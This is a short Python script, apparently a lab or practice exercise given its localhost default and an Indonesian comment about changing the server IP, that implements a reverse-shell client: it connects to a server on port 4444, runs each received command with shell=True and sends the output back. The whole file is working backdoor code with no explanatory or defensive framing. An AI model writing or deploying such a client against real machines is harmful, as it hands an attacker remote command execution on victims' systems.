import socket
import subprocess

SERVER_IP = '127.0.0.1'  # Ganti dgn IP server jika beda mesin
SERVER_PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    client.send(output)

client.close()